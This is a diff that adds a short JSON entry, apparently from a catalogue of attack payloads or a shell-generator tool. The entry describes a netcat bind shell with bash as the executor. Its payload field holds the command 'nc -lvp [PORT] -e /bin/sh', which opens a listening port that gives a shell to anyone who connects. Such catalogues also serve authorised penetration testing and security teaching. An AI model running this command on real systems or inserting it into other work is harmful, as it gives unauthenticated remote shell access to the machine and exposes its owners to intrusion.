@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "Use netcat and setup a bind shell",
+      "type": "bind",
+      "exec": "bash"
+    },
+    "payload": "nc -lvp [PORT] -e /bin/sh"
+  }
+}
